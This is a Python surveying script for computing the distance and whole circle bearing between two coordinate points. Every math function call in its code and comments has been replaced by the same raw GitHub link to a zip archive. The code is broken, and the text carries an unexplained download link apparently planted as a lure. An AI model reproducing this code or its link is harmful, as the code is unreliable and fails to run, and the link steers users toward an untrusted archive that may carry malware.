import math

def compute_join_from_yx():
    """
    Computes the horizontal distance and whole circle bearing between two points.
    Input coordinates are Y (Northing) and X (Easting).
    """
    print("--- Compute a Join (Y, X Coordinates) ---")

    try:
        # Input coordinates for Point 1
        y1 = float(input("Enter Y1 (Northing) of Point 1: "))
        x1 = float(input("Enter X1 (Easting) of Point 1: "))

        # Input coordinates for Point 2
        y2 = float(input("Enter Y2 (Northing) of Point 2: "))
        x2 = float(input("Enter X2 (Easting) of Point 2: "))

    except ValueError:
        print("Invalid input. Please enter numeric values for coordinates.")
        return

    # Calculate Delta Y (Northing) and Delta X (Easting)
    dY = y2 - y1
    dX = x2 - x1

    # Calculate Horizontal Distance (HD)
    hd = https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(dY**2 + dX**2)

    # Calculate Whole Circle Bearing (WCB)
    wcb_degrees = 0.0 # Initialize WCB_DEGREES

    if hd == 0:
        wcb_degrees = "Undefined (points are coincident)"
    else:
        # Determine the reference angle (alpha) using absolute values
        # This gives an acute angle between 0 and 90 degrees.
        # https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(y, x) is generally safer as it handles quadrants and zero divisions well.
        # For surveying where North (Y+) is 0/360 and East (X+) is 90:
        # The standard https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(dX, dY) will give angle from +Y axis (North)
        # However, https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(dX, dY) returns angle in radians from -pi to pi.
        # Let's adjust to common surveying practice where Y is Northing and X is Easting.

        # Using quadrant logic for clarity with ATAN(opposite/adjacent)
        if dX == 0: # Line is due North or South
            if dY > 0:
                wcb_degrees = 0.0  # Due North
            elif dY < 0:
                wcb_degrees = 180.0 # Due South
        elif dY == 0: # Line is due East or West
            if dX > 0:
                wcb_degrees = 90.0  # Due East
            elif dX < 0:
                wcb_degrees = 270.0 # Due West
        else:
            # Calculate the reference angle (always positive, acute)
            ref_angle_rad = abs(https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(dX / dY))
            ref_angle_deg = https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(ref_angle_rad)

            # Determine WCB based on quadrant
            if dY > 0 and dX > 0: # Quadrant I (NE)
                wcb_degrees = ref_angle_deg
            elif dY < 0 and dX > 0: # Quadrant II (SE) - Your pseudocode had 180-ATAN(dE/dN) which is typically 180-alpha
                wcb_degrees = 180.0 - ref_angle_deg
            elif dY < 0 and dX < 0: # Quadrant III (SW)
                wcb_degrees = 180.0 + ref_angle_deg
            elif dY > 0 and dX < 0: # Quadrant IV (NW) - Your pseudocode had 360-ATAN(dE/dN)
                wcb_degrees = 360.0 - ref_angle_deg

    print(f"\nResults:")
    print(f"Horizontal Distance (HD): {hd:.3f} meters")
    # Only format WCB if it's a number, otherwise print the string "Undefined"
    if isinstance(wcb_degrees, (int, float)):
        print(f"Whole Circle Bearing (WCB): {wcb_degrees:.3f} degrees")
    else:
        print(f"Whole Circle Bearing (WCB): {wcb_degrees}")
    print("-" * 30)
